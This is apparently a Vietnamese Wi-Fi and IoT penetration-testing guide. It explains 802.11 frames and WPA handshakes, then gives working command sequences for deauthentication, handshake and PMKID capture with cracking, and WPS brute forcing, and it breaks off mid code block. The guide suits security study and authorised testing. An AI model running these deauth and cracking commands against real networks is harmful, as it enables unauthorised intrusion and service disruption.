# WIRELESS & IOT PENTEST MASTERY
## Kiến thức toàn diện về kiểm thử bảo mật không dây và IoT

> **Tác giả:** Hermes Agent — Nous Research
> **Ngày:** 26/05/2026
> **Mục đích:** Tài liệu tham khảo chuyên sâu dành cho pentester, security researcher và IoT security analyst. Nội dung bằng tiếng Việt (giải thích) + thuật ngữ tiếng Anh (kỹ thuật).

---

# MỤC LỤC

1. [A. WIRELESS NETWORKING BASICS](#a-wireless-networking-basics)
2. [B. WIRELESS RECON](#b-wireless-recon)
3. [C. WIRELESS ATTACKS](#c-wireless-attacks)
4. [D. WIRELESS ENTERPRISE ATTACKS](#d-wireless-enterprise-attacks)
5. [E. BLUETOOTH ATTACKS](#e-bluetooth-attacks)
6. [F. RFID/NFC ATTACKS](#f-rfidnfc-attacks)
7. [G. SDR & RADIO ATTACKS](#g-sdr--radio-attacks)
8. [H. IOT/HARDWARE ATTACKS](#h-iothardware-attacks)
9. [I. IOT VULNERABILITIES](#i-iot-vulnerabilities)
10. [J. TOOL MASTERY](#j-tool-mastery)
11. [K. TOP RESOURCES](#k-top-resources)
12. [L. KEY INSIGHTS](#l-key-insights)

---

# A. WIRELESS NETWORKING BASICS

## 1. Tổng quan về chuẩn 802.11

Wireless networking dựa trên bộ chuẩn IEEE 802.11, phát triển qua nhiều thế hệ:

### 1.1. Các chuẩn 802.11

| Tên chuẩn | Băng tần | Tốc độ tối đa | Năm |
|-----------|----------|---------------|-----|
| **802.11a** | 5 GHz | 54 Mbps | 1999 |
| **802.11b** | 2.4 GHz | 11 Mbps | 1999 |
| **802.11g** | 2.4 GHz | 54 Mbps | 2003 |
| **802.11n (Wi-Fi 4)** | 2.4/5 GHz | 600 Mbps | 2009 |
| **802.11ac (Wi-Fi 5)** | 5 GHz | 6.9 Gbps | 2013 |
| **802.11ax (Wi-Fi 6/6E)** | 2.4/5/6 GHz | 9.6 Gbps | 2019 |
| **802.11be (Wi-Fi 7)** | 2.4/5/6 GHz | 46 Gbps | 2024 |

**Chi tiết quan trọng:**

- **802.11n**: Giới thiệu MIMO (Multiple Input Multiple Output), channel bonding (40 MHz), và frame aggregation. Đây là bước ngoặt về tốc độ.
- **802.11ac**: Chỉ hoạt động ở 5 GHz, hỗ trợ MU-MIMO (downlink), 160 MHz channel bandwidth, 256-QAM modulation.
- **802.11ax (Wi-Fi 6)**: OFDMA (Orthogonal Frequency Division Multiple Access) thay vì OFDM, hỗ trợ BSS Coloring để giảm interference, Target Wake Time (TWT) cho IoT tiết kiệm pin, 1024-QAM.
- **Wi-Fi 6E**: Mở rộng lên băng tần 6 GHz (5925-7125 MHz), thêm 1200 MHz spectrum mới, ít nhiễu hơn.
- **802.11be (Wi-Fi 7)**: 320 MHz bandwidth, 4096-QAM, Multi-Link Operation (MLO), 16×16 MU-MIMO.

### 1.2. Tần số và kênh (Channels & Bands)

**2.4 GHz Band (2400-2483.5 MHz):**
- 14 kênh, mỗi kênh rộng 22 MHz (802.11b) hoặc 20 MHz (802.11g/n)
- Kênh không chồng lấn: 1, 6, 11 (Bắc Mỹ), 1, 5, 9, 13 (ETSI Châu Âu)
- Nhiễu cao do: Bluetooth, microwave, baby monitors, Zigbee — đây là băng tần ISM (Industrial, Scientific, Medical) công cộng
- Ưu điểm: xuyên tường tốt hơn 5 GHz

**5 GHz Band (5150-5850 MHz):**
- Nhiều kênh không chồng lấn hơn (UNII-1 đến UNII-3)
- Ít nhiễu hơn 2.4 GHz
- DFS (Dynamic Frequency Selection): tránh nhiễu với radar
- TPC (Transmit Power Control)

**6 GHz Band (Wi-Fi 6E/7):**
- 5925-7125 MHz (Bắc Mỹ), 5945-6425 MHz (ETSI)
- Yêu cầu WPA3 bắt buộc
- 59 kênh 20 MHz, 29 kênh 40 MHz, 14 kênh 80 MHz, 7 kênh 160 MHz

### 1.3. Regulatory Domains

Mỗi quốc gia/vùng quản lý việc sử dụng tần số vô tuyến:

- **FCC (Mỹ)**: Cho phép kênh 1-11 (2.4 GHz), công suất tối đa 1W (30 dBm)
- **ETSI (Châu Âu)**: Cho phép kênh 1-13 (2.4 GHz), công suất tối đa 100 mW (20 dBm) EIRP
- **MIC (Nhật Bản)**: Cho phép kênh 1-14 (2.4 GHz), kênh 14 chỉ dùng 802.11b
- **Việt Nam**: Tuân theo chuẩn ETSI (kênh 1-13)

> **Lưu ý pentest:** Khi capture ở nước ngoài, dùng `iw reg set BO` hoặc `iw reg set US` để mở khóa kênh cho monitor mode. Ở Việt Nam, dùng `iw reg set VN` hoặc set về `00` (Worldwide).

## 2. 802.11 Frames — Kiến trúc khung tin

Wi-Fi sử dụng 3 loại frame chính:

### 2.1. Management Frames

Đây là các frame quan trọng nhất cho pentest wireless vì chúng chứa nhiều thông tin:

- **Beacon Frame**: AP phát định kỳ (mỗi 102.4 ms) để quảng bá sự tồn tại. Chứa SSID, supported rates, capabilities, RSN IE (Robust Security Network Information Element), HT/VHT/HE capabilities, Country IE, Power Constraint IE, Vendor-specific IE.
  - **Cách exploit**: Beacon flood attack — gửi hàng loạt beacon giả để làm nhiễu hoặc crash client.

- **Probe Request**: Client gửi để tìm AP (broadcast) hoặc AP cụ thể (directed). Chứa SSID (có thể là hidden nếu client đã từng kết nối).
  - **Cách exploit**: KARMA attack — AP giả trả lời mọi probe request, kể cả directed.

- **Probe Response**: AP trả lời probe request. Chứa thông tin tương tự beacon.
  - **Cách exploit**: Probe response flood — gây DoS cho client.

- **Authentication Request/Response**: Client gửi auth frame (open system, shared key...).
  - **Cách exploit**: Auth flood (AKA Authentication DoS) — gửi hàng loạt auth frame đến AP làm treo/DoS AP.

- **Association Request/Response**: Client gửi assoc request để kết nối, chứa supported rates, capabilities, SSID.
  - **Cách exploit**: Disassociation attack — gửi spoofed disassoc frame đến client làm ngắt kết nối.

- **Deauthentication Frame**: Quan trọng nhất cho pentest! Gửi từ AP đến client (hoặc ngược lại) để ngắt kết nối.
  - **Cách exploit**: Deauth attack — giả mạo địa chỉ AP gửi deauth đến client, buộc client phải kết nối lại → bắt được 4-way handshake.

- **Disassociation Frame**: Tương tự deauth nhưng nhẹ hơn, client có thể tự kết nối lại.

### 2.2. Control Frames

- **RTS (Request to Send)** — chuẩn bị gửi dữ liệu
- **CTS (Clear to Send)** — sẵn sàng nhận
- **ACK (Acknowledgment)** — xác nhận đã nhận
- **PS-Poll** — client đánh thức AP để lấy buffered data
- **CF-End** — kết thúc contention-free period

### 2.3. Data Frames

Mang payload dữ liệu thực tế. Có thể là:

- **Data**: dữ liệu thông thường
- **Null Data**: không có payload, dùng cho power management
- **QoS Data**: ưu tiên chất lượng dịch vụ
- **CF-Ack, CF-Poll (và kết hợp)**: dùng trong PCF mode (hiếm gặp)

### 2.4. Frame Format Chi tiết

```
802.11 MAC Header (24-34 bytes):
  ┌─────────┬──────┬──────┬──────────┬──────────┬──────────┬──────────┐
  │FrameCtrl│Dur/ID│Addr1 │  Addr2   │  Addr3   │Seq-ctl   │  Addr4   │
  │  (2B)   │ (2B) │ (6B) │   (6B)   │   (6B)   │  (2B)    │  (6B)    │
  └─────────┴──────┴──────┴──────────┴──────────┴──────────┴──────────┘
  Frame Body (0-2312 bytes)
  FCS (4 bytes)
```

**Frame Control Field (2 bytes):**
- Protocol Version (2 bits)
- Type (2 bits): 00=Management, 01=Control, 10=Data, 11=Reserved
- Subtype (4 bits): cụ thể hóa loại frame
- To DS, From DS (1 bit each): xác định hướng frame
- More Fragments, Retry, Power Management, More Data, Protected Frame, Order

### 2.5. Addr1-Addr4 — Giải thích

Địa chỉ trong 802.11 rất linh hoạt:
- **Addr1**: Receiver Address (RA) — địa chỉ đích ngay lập tức
- **Addr2**: Transmitter Address (TA) — địa chỉ nguồn ngay lập tức
- **Addr3**: Thay đổi tùy context: BSSID, Source Address (SA), hoặc Destination Address (DA)
- **Addr4**: Khi ở chế độ WDS (Wireless Distribution System)

## 3. Wireless Security Protocols

### 3.1. WEP (Wired Equivalent Privacy) — KHÔNG BAO GIỜ DÙNG

- **Thuật toán**: RC4 stream cipher
- **Key**: 40-bit hoặc 104-bit + 24-bit IV (Initialization Vector) = 64-bit hoặc 128-bit
- **Vấn đề**: IV quá ngắn (24-bit), dễ bị lặp → gửi ~5000 packet là có thể crack
- **Crack**: aircrack-ng với ARP replay attack (aireplay-ng -3) — thu thập đủ IVs (~20,000) → crack trong vài giây
- **WEP2/WEPplus**: Cải thiện nhẹ nhưng vẫn không an toàn

### 3.2. WPA (Wi-Fi Protected Access)

- **Thuật toán**: TKIP (Temporal Key Integrity Protocol) dựa trên RC4
- **Cải thiện so với WEP**: Per-packet key mixing, Message Integrity Check (MIC), IV sequencing
- **Vấn đề**: TKIP vẫn dùng RC4, có thể bị tấn công qua Beck-Tews attack (2008), Hole196 attack
- **WPA-TKIP hiện nay**: Có thể giải mã packet nếu biết được MIC key

### 3.3. WPA2 — Chuẩn phổ biến nhất hiện nay

- **Thuật toán**: CCMP (Counter Mode with CBC-MAC Protocol) dựa trên AES
- **Xác thực**: PSK (Pre-Shared Key) hoặc Enterprise (802.1X/EAP)
- **4-Way Handshake**: Quá trình trao đổi key giữa client và AP
- **Vấn đề chính**: KRACK (2017) — cho phép replay của 3-way handshake, buộc dùng key đã biết

### 3.4. WPA3 — Chuẩn mới nhất

- **Thuật toán**: SAE (Simultaneous Authentication of Equals) — dựa trên Dragonfly handshake
- **Thay đổi chính**: Thay thế PSK bằng SAE, chống offline dictionary attack
- **WPA3-Enterprise**: Tùy chọn 192-bit security suite (CNSA Suite)
- **WPA3-Personal**: SAE handshake — dù biết hash của password cũng không crack được offline
- **Vấn đề**: Dragonblood attacks (2019) — side-channel, downgrade attack

### 3.5. WPS (Wi-Fi Protected Setup)

- **Mục đích**: Dễ dàng kết nối thiết bị vào mạng
- **Phương thức**: PIN (8 số), PBC (Push Button), NFC
- **Vấn đề**: WPS PIN chỉ có ~11,000 khả năng (7 số đầu + checksum) → brute force dễ dàng
- **Pixie Dust**: Lỗ hổng trong implementation của nhiều chipset (Ralink, Realtek, Broadcom) cho phép tính toán PIN từ E-S1 và E-S2 — hack trong vài giây

### 3.6. So sánh Security Protocols

| Tính năng | WEP | WPA-TKIP | WPA2-CCMP | WPA3-SAE |
|-----------|-----|---------|-----------|----------|
| Cipher | RC4 | RC4 | AES-CCMP | AES-GCMP |
| Key size | 40/104-bit | 128-bit | 128-bit | 128/192-bit |
| Authentication | Open/Shared | PSK/802.1X | PSK/802.1X | SAE/802.1X |
| Protected Mgmt Frames | ❌ | ❌ | ❌ (optional in 802.11w) | ✅ (mandatory) |
| Offline dictionary attack | ✅ | ✅ | ✅ | ❌ (SAE) |
| Forward secrecy | ❌ | ❌ | ❌ | ✅ |
| Năm giới thiệu | 1997 | 2003 | 2004 | 2018 |

## 4. PMK, PTK, GTK, MIC và 4-Way Handshake

### 4.1. Các khái niệm

- **PSK (Pre-Shared Key)** = PBKDF2(Passphrase, SSID, 4096, 256) — tạo ra PMK
- **PMK (Pairwise Master Key)** = PSK (trong WPA2-PSK) hoặc từ RADIUS server (trong Enterprise)
- **PMKID (PMK ID)** = HMAC-SHA1(PMK, "PMK Name" || AA || SPA) — dùng để cache
- **PTK (Pairwise Transient Key)** = PRF(PMK, "Pairwise key expansion", Min(AA,SPA) || Max(AA,SPA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
- **GTK (Group Temporal Key)** — key dùng cho broadcast/multicast traffic, được mã hóa trong WPA2 4-way handshake (Message 3)
- **MIC (Message Integrity Code)** — dùng để xác thực các message trong handshake

### 4.2. Chi tiết 4-Way Handshake

Đây là quá trình quan trọng nhất cần hiểu rõ để bắt và crack WPA2:

```
STA (Client)                              AP
    |                                       |
    |<------- Message 1: ANonce -----------|
    |  (AP gửi random ANonce cho client)   |
    |                                       |
    |------- Message 2: SNonce + MIC ----->|
    |  (Client tạo SNonce, tính PTK,       |
    |   gửi SNonce + MIC để AP verify)     |
    |                                       |
    |<------- Message 3: GTK + MIC --------|
    |  (AP gửi GTK đã mã hóa, MIC)        |
    |                                       |
    |------- Message 4: ACK + MIC -------->|
    |  (Xác nhận đã cài đặt keys)          |
```

**Cách PTK được tính:**
```
PTK = PRF(PMK, "Pairwise key expansion",
          min(AA,SPA) || max(AA,SPA) ||
          min(ANonce,SNonce) || max(ANonce,SNonce))
```

**PTK bao gồm:**
- KC: EAPOL-Key Confirmation Key (MIC key) — 16 bytes
- KEK: EAPOL-Key Encryption Key (mã hóa GTK) — 16 bytes
- TK: Temporal Key (mã hóa dữ liệu unicast) — 16 bytes
- KC_2, KEK_2, TK_2 — dự phòng

### 4.3. PMKID Attack — Không cần client!

Đây là attack quan trọng nhất cho WPA2 pentest hiện nay:

- PMKID được tính bởi AP và gửi trong RSN IE của beacon/probe response
- Công thức: `PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || STA MAC)`
- **Lợi thế**: Không cần client, không cần deauth, chỉ cần một beacon/probe response từ AP
- Công cụ: `hcxdumptool -o capture.pcapng -i wlan0mon` (chạy vài giây là có PMKID)

**Hashcat mode:**
- PMKID: mode 16800 (hash: `hash*PMKID*MACAP*MACSTA*ESSID`)
- WPA2 (handshake): mode 22000
- WPA2 (PMKID từ hcxdumptool): mode 22000 (mới) hoặc 16800 (cũ)

## 5. Kênh, băng tần và Regulatory Domains

### 5.1. Channel Widths

- **20 MHz**: Cơ bản nhất, tương thích với mọi thiết bị
- **40 MHz**: Dùng channel bonding (2 kênh 20 MHz), chỉ nên dùng ở 5 GHz
- **80 MHz**: 802.11ac, 4 kênh 20 MHz bonded
- **160 MHz**: 802.11ac Wave 2, 8 kênh bonded
- **320 MHz**: Wi-Fi 7, 16 kênh bonded

### 5.2. Channel Hopping trong Pentest

Khi dùng monitor mode, card Wi-Fi nhảy kênh liên tục để capture tất cả traffic:
- **Default rate**: ~20 channels/second trên 2.4 GHz
- **Vấn đề**: Có thể bỏ lỡ handshake trên một kênh cụ thể
- **Giải pháp**: Lock kênh với `airodump-ng -c <channel> --bssid <BSSID>`
- **Multi-channel**: Dùng nhiều card Wi-Fi, mỗi card lock một kênh

### 5.3. Các lệnh quản lý kênh

```bash
# Xem thông tin wireless
iw dev wlan0 info
iw reg get

# Set regulatory domain
iw reg set US   # Mỹ (kênh 1-11)
iw reg set DE   # Đức (kênh 1-13)
iw reg set JP   # Nhật (kênh 1-14)
iw reg set BO   # Bolivia (không hạn chế)
iw reg set 00   # Worldwide (không hạn chế)

# Set channel cho monitor interface
iw dev wlan0mon set channel 6
iw dev wlan0mon set channel 149 5GHz   # Kênh 5 GHz

# Scan channels
iw dev wlan0 scan
```

---

# B. WIRELESS RECON

## 1. airodump-ng — Công cụ recon cốt lõi

### 1.1. Cơ bản

```bash
# Kích hoạt monitor mode
airmon-ng check kill          # Kill tiến trình conflict
airmon-ng start wlan0         # Tạo wlan0mon
ip link set wlan0mon down
iw dev wlan0mon set type monitor
ip link set wlan0mon up

# Bắt đầu capture tất cả
airodump-ng wlan0mon

# Capture với filter
airodump-ng -w capture -c 6 --bssid 00:11:22:33:44:55 wlan0mon
```

### 1.2. Output fields

```
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC CIPHER AUTH ESSID
00:11:22:33:44:55  -67     120      320    5   11  130  WPA2 CCMP   PSK  MyWiFi

BSSID              STATION            PWR   Rate    Lost   Frames  Probe
00:11:22:33:44:55  66:77:88:99:AA:BB  -45   54e-54m  12     340
```

- **PWR**: RSSI (dBm) — càng gần 0 càng mạnh, -30 là rất mạnh, -90 là yếu
- **Beacons**: Số beacon frame AP gửi (tỉ lệ thuận với thời gian)
- **#Data**: Số data frame — nhiều data = nhiều hoạt động
- **CH**: Kênh
- **MB**: Max rate (Mbps)
- **ENC**: WEP, WPA, WPA2, WPA3, OPN
- **CIPHER**: CCMP, TKIP, GCMP
- **AUTH**: PSK, MGT (Enterprise), SAE, OWE
- **ESSID**: Tên mạng (có thể là `<hidden>`)

### 1.3. Output files

```bash
airodump-ng -w capture wlan0mon   # Tạo các file:
# capture-01.cap       — Packet capture
# capture-01.csv       — CSV output
# capture-01.kismet.csv — Kismet-compatible
# capture-01.kismet.netxml — Kismet NetXML
```

## 2. Kismet — Passive Discovery

Kismet là công cụ passive discovery mạnh mẽ hơn airodump:

```bash
# Khởi động Kismet
kismet -c wlan0mon

# Kismet server mode
kismet -c wlan0mon --override wardrive --use-gpsd --gps-serial /dev/ttyUSB0

# Giao diện web mặc định: http://localhost:2501
```

**So sánh airodump-ng vs Kismet:**

| Tính năng | airodump-ng | Kismet |
|-----------|-------------|--------|
| Passive | ✅ | ✅ |
| GPS wardriving | Cần gpsd + script | Built-in |
| BLE detection | ❌ | ✅ |
| Device fingerprinting | ❌ | ✅ |
| Packet logging | ✅ (.cap) | ✅ (.pcapng) |
| Web UI | ❌ | ✅ |
| Plugin system | ❌ | ✅ |
| Crypto detection | Cơ bản | Nâng cao |

## 3. Wash — WPS Discovery

```bash
# Scan WPS-enabled APs
wash -i wlan0mon

# Output:
# BSSID               Channel  RSSI   WPS Version  WPS Locked  ESSID
# 00:11:22:33:44:55   6        -62    1.0          No          MyWiFi

# Scan một kênh cụ thể
wash -i wlan0mon -c 6

# Lưu kết quả
wash -i wlan0mon -o wps_scan.txt
```

**Thông tin WPS quan trọng từ wash:**
- **WPS Version**: 1.0 hoặc 2.0
- **WPS Locked**: Nếu locked, brute force PIN không hiệu quả
- **AP Setup Locked**: AP khóa WPS sau nhiều lần thất bại
- **Manufacturer**: Hãng sản xuất chipset
- **Device Name**: Tên thiết bị

## 4. Airodump-ng: Target-specific Capture

Chiến lược capture cho pentest:

```bash
# Bước 1: Scan tổng quan để tìm target
airodump-ng wlan0mon

# Bước 2: Lock vào target AP và channel
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Bước 3: Deauth để bắt handshake (cửa sổ khác)
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

# Bước 4: Kiểm tra handshake đã capture
aircrack-ng handshake-01.cap
```

## 5. Wi-Fi Adapter Selection

### 5.1. Chipset khuyên dùng cho Pentest

| Chipset | Chuẩn | Bands | Monitor | Packet Injection | Ưu điểm |
|---------|-------|-------|---------|-----------------|---------|
| **Atheros AR9271** | 802.11n | 2.4 GHz | ✅ | ✅ | Ổn định, giá rẻ |
| **RTL8812AU** | 802.11ac | 2.4/5 GHz | ✅ | ✅ | Hỗ trợ 5 GHz, AC |
| **RTL8814AU** | 802.11ac | 2.4/5 GHz | ✅ | ✅ | 4 antenna |
| **Atheros QCA6174** | 802.11ac | 2.4/5 GHz | ✅ | ✅ | Tích hợp laptop |
| **Intel AX200/AX210** | Wi-Fi 6/6E | 2.4/5/6 GHz | ✅ | ❌ (hạn chế) | Wi-Fi 6E |
| **Mediatek MT7921/MT7922** | Wi-Fi 6/6E | 2.4/5/6 GHz | ✅ | ❌ | Wi-Fi 6 |
| **RTL8814AU** | 802.11ac | 2.4/5 GHz | ✅ | ✅ | 4x antenna MIMO |

### 5.2. Adapter khuyên dùng

- **Alfa AWUS036ACH** (RTL8812AU) — Phổ biến nhất, 5 GHz AC
- **Alfa AWUS036ACM** (MT7612U) — Tốt cho 5 GHz
- **Alfa AWUS036AXML** (MT7921) — Wi-Fi 6
- **Panda Wireless PAU09** (AR9271) — 2.4 GHz ổn định
- **TP-Link TL-WN722N v1/v2** (AR9271) — Giá rẻ, chỉ 2.4 GHz
- **Alfa AWUS1900** (RTL8814AU) — 4 antenna

### 5.3. Driver setup cho RTL8812AU

```bash
# Kali Linux
apt install realtek-rtl88xxau-dkms

# Build từ source
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au
make && make install

# Kiểm tra driver loaded
lsmod | grep 88xxau
iw list | grep -A 10 "Supported interface modes"
```

## 6. Signals: RSSI, SNR, Antenna Theory

### 6.1. RSSI (Received Signal Strength Indicator)

- **Dải**: -30 dBm (rất mạnh) đến -90 dBm (rất yếu)
- **-30 dBm**: AP ngay cạnh
- **-50 dBm**: Tốt, trong cùng phòng
- **-67 dBm**: Khá, xa hơn
- **-75 dBm**: Yếu, cần antenna tốt
- **-85 dBm**: Rất yếu, khó capture ổn định
- **-90+ dBm**: Nhiễu, gần như không dùng được

### 6.2. SNR (Signal-to-Noise Ratio)

- `SNR = RSSI - Noise Floor`
- **SNR > 25 dB**: Tuyệt vời
- **SNR 15-25 dB**: Tốt
- **SNR 10-15 dB**: Trung bình
- **SNR < 10 dB**: Kém

### 6.3. Antenna Theory

**Loại antenna dùng trong pentest:**

- **Omnidirectional**: Bức xạ đều mọi hướng, gain 2-8 dBi
  - Dùng cho: wardriving, general recon
  - Ví dụ: Alfa 7 dBi, 9 dBi high-gain

- **Directional (Yagi)**: Tập trung sóng vào một hướng, gain 10-20 dBi
  - Dùng cho: Long-range targeting, deauth từ xa
  - Ví dụ: Yagi 15 dBi, Parabolic grid 24 dBi

- **Patch/Panel**: Bán định hướng, 8-14 dBi
  - Dùng cho: Xuyên tường

- **Sector**: 60-180 độ, dùng cho AP ngoài trời

**Quy tắc antenna:**
- Double gain (dBi) = double range (không hoàn toàn tuyến tính)
- 3 dB gain = gấp đôi công suất
- Antenna không tạo năng lượng, chỉ tập trung nó

### 6.4. Antenna Connectors

- **RP-SMA**: Reverse Polarity SMA — phổ biến trên Alfa AWUS036ACH
- **SMA**: Straight SMA
- **MCX, MMCX, U.FL, IPEX**: Connector nhỏ cho card laptop/mini PCIe
- **N-Type**: Cho antenna ngoài trời công suất cao

> **Lưu ý:** Khi mua adapter, kiểm tra connector type. Hầu hết adapter pentest dùng RP-SMA.

### 6.5. Practical Tips cho Signal Optimization

```bash
# Kiểm tra signal strength
iw dev wlan0mon link
iw dev wlan0mon station dump

# Tăng công suất TX (có thể bất hợp pháp ở nhiều nước)
iw dev wlan0mon set txpower fixed 3000   # 30 dBm = 1W

# Giảm noise bằng cách set channel ít nhiễu
# Dùng WLAN Pi hoặc Ekahau để survey nhiễu

# Spectrum analysis
# Công cụ: Wi-Fi Explorer (Mac), Wireshark + radio tap header
```

---

# C. WIRELESS ATTACKS

## 1. WPA2 Handshake Capture & Cracking

### 1.1. Lý thuyết

WPA2-PSK dùng mật khẩu (passphrase) từ 8-63 ký tự. Passphrase được biến đổi qua PBKDF2 để tạo PMK:
```
PMK = PBKDF2(Passphrase, SSID, 4096, 256)
```

Cracking là thử từng passphrase → tính PMK → so sánh với handshake đã capture.

### 1.2. Quy trình chi tiết

```bash
# Bước 1: Enable monitor mode
airmon-ng check kill
airmon-ng start wlan0
ip link set wlan0mon up

# Bước 2: Scan mạng
airodump-ng wlan0mon

# Bước 3: Capture target (mở terminal thứ hai)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Bước 4: Deauth client để bắt handshake (terminal thứ ba)
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c CLIENT_MAC wlan0mon

# Bước 5: Kiểm tra handshake trong capture
aircrack-ng handshake-01.cap
# Output: "1 handshake(s)" — thành công!

# Bước 6: Crack với aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Bước 7: Crack với hashcat (nhanh hơn - dùng GPU)
# Chuyển .cap sang .hccapx (cũ) hoặc .22000 (mới)
hcxpcapngtool handshake-01.cap -o handshake.22000
hashcat -m 22000 handshake.22000 /usr/share/wordlists/rockyou.txt -w 4
```

### 1.3. Convert capture files

```bash
# Cách cũ: .cap → .hccapx
cap2hccapx handshake-01.cap handshake.hccapx
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt

# Cách mới (ưu tiên): .cap → .22000
hcxpcapngtool -o hash.22000 handshake-01.cap

# Kiểm tra nội dung file .22000
# Format: hashinfo*mic*mac_ap*nonce_ap*mac_client*nonce_client*essid
```

### 1.4. Vấn đề thường gặp

- **Có handshake nhưng không crack được**: Wordlist không chứa password, thử rule-based attack
  ```bash
  hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
  ```

- **Không bắt được handshake dù deauth**: Client quá xa hoặc client không reconnect, thử capture lâu hơn
  ```bash
  aireplay-ng -0 0 -a BSSID wlan0mon   # Continuous deauth (số 0)
  ```

- **Multiple handshakes trong một capture**: aircrack-ng sẽ chọn handshake đầu tiên

### 1.5. Tối ưu hashcat cho WPA

```bash
# Benchmark GPU
hashcat -b --benchmark-all

# Mode 22000 optimization
hashcat -m 22000 hash.22000 wordlist.txt -O -w 4 --potfile-path=wpa.pot

# Mask attack
hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?l?l  # 8 lowercase chars

# Rule-based
hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Combinator attack
hashcat -m 22000 hash.22000 -a 1 wordlist1.txt wordlist2.txt
```

## 2. PMKID Attack — Không cần Client

### 2.1. Lý thuyết

PMKID được tính bởi AP và gửi trong RSN IE (Robust Security Network Information Element) của Beacon và Probe Response frame:
```
PMKID = HMAC-SHA1(PMK, "PMK Name" || AA || SPA)
```

- AA = Authenticator Address (AP BSSID)
- SPA = Supplicant Address (Client MAC, thường là 00:00:00:00:00:00 trong beacon)
- PMK = PBKDF2(Passphrase, SSID, 4096, 256)

**Lợi thế:** Không cần client kết nối, chỉ cần một beacon frame từ AP → capture trong vài giây.

### 2.2. Quy trình

```bash
# Cách 1: hcxdumptool (recommended)
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1

# Cách 2: hcxpcapngtool từ pcap có sẵn
hcxpcapngtool capture.pcapng -o hash.22000

# Xem hash
cat hash.22000

# Crack PMKID
hashcat -m 22000 hash.22000 wordlist.txt
```

### 2.3. So sánh PMKID vs Handshake Attack

| Tiêu chí | PMKID Attack | Handshake Attack |
|----------|-------------|-----------------|
| Cần client | ❌ | ✅ |
| Cần deauth | ❌ | ✅ (thường) |
| Thời gian capture | Vài giây | Có thể lâu |
| AP compatibility | Chỉ AP hỗ trỗ PMKID (hầu hết mới) | Tất cả WPA2 |
| Hashcat mode | 16800 (cũ) / 22000 (mới) | 22000 |
| Độ tin cậy | Phụ thuộc vào driver | Cao |

### 2.4. PMKID không hoạt động khi nào?

- AP quá cũ (trước ~2016 thường không gửi PMKID trong Probe Response)
- AP không hỗ trợ PMKID (disable trong cấu hình)
- Beacon capture không chứa RSN IE đầy đủ
- Driver không capture được radiotap header

## 3. WPS Brute Force & Pixie Dust

### 3.1. WPS PIN Structure

WPS PIN gồm 8 số (tổng cộng 10^8 = 100,000,000 khả năng), nhưng:

- Số thứ 8 là checksum (từ số 1-7)
- 7 số đầu có 10^7 = 10,000,000 khả năng
- Nhưng WPS chia PIN làm 2 nửa và xác thực riêng:
  - Nửa 1: 4 số đầu (10^4 = 10,000 khả năng)
  - Nửa 2: 3 số giữa (10^3 = 1,000 khả năng) — 3 số vì số cuối là checksum
- **Tổng cộng tối đa chỉ cần thử**: 10,000 + 1,000 = 11,000 PIN!

### 3.2. Online Brute Force

```bash
# Reaver (truyền thống)
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# Reaver với các tùy chọn optimize
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 0 -l 10 -N -r 3:30

# Bully (nhanh hơn Reaver)
bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 2

# OneShot (tự động hóa)
oneshot.py -i wlan0mon -b 00:11:22:33:44:55
```

**Giải thích tham số Reaver:**
- `-d 0`: Delay giữa các lần thử = 0 (nhanh nhất, có thể gây crash AP)
- `-l 10`: Lock wait time (thời gian chờ nếu AP bị lock)
- `-N`: Không gửi NACK (ẩn lỗi)
- `-r 3:30`: Retry 3 lần sau mỗi 30 giây

### 3.3. Pixie Dust Attack

Đây là attack hiệu quả nhất cho WPS. Dựa trên lỗ hổng trong Ralink, MediaTek, Realtek, Broadcom chipset.

**Lý thuyết:** Khi WPS exchange, AP tạo 2 nonce: E-S1 và E-S2. Trong một số implementation, các nonce này yếu (có thể tính toán được từ thông tin công khai).

```bash
# OneShot với Pixie Dust
oneshot.py -i wlan0mon -b 00:11:22:33:44:55 -K   # -K = Pixie Dust

# PixieWPS
pixiewps --e-s1=ES1_VALUE --e-s2=ES2_VALUE --e-hash1=EHASH1 --e-hash2=EHASH2 --authkey=AUTHKEY --pke=PKE_VALUE --pkr=PKR_VALUE

# Reaver với Pixie Dust
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1 -N -d 0

# Oneshot GUI
python3 oneshot_gui.py
```

### 3.4. Các tình huống WPS

- **AP locked**: WPS lock sau 3-5 lần thất bại → Chờ unlock (thường 5-60 phút)
- **AP not locked**: Có thể brute force toàn bộ 11,000 PIN (~4-10 giờ)
- **Pixie Dust vulnerable**: Có PIN trong < 30 giây
- **WPS disabled**: Không thể tấn công WPS

## 4. WPA3: Dragonblood Attacks

### 4.1. Tổng quan về SAE (Simultaneous Authentication of Equals)

WPA3 thay thế PSK handshake bằng SAE (dựa trên Dragonfly key exchange):
- Sử dụng Finite Field Diffie-Hellman (FFC) hoặc Elliptic Curve (ECC)
- Chống offline dictionary attack: password không bao giờ được gửi qua không khí
- Mỗi kết nối dùng password element (PWE) khác nhau

### 4.2. Dragonblood Attacks (2019 — Mathy Vanhoef)

**Nhóm tấn công chính:**

1. **Downgrade Attack**: Lừa client kết nối WPA3-capable AP về WPA2 → bắt handshake và crack PSK cũ

2. **Timing Attack**: Đo thời gian phản hồi của SAE commit → phân biệt password đúng/sai dựa vào timing của HPO (Hunting and Pecking) loop

3. **Side-Channel Attack**: Cache-based timing attack trên CPU để đọc PWE

4. **DoS**: Gửi SAE Commit message sai → AP/Client tiêu tốn CPU để tính PWE vô ích

### 4.3. Công cụ WPA3 attack

```bash
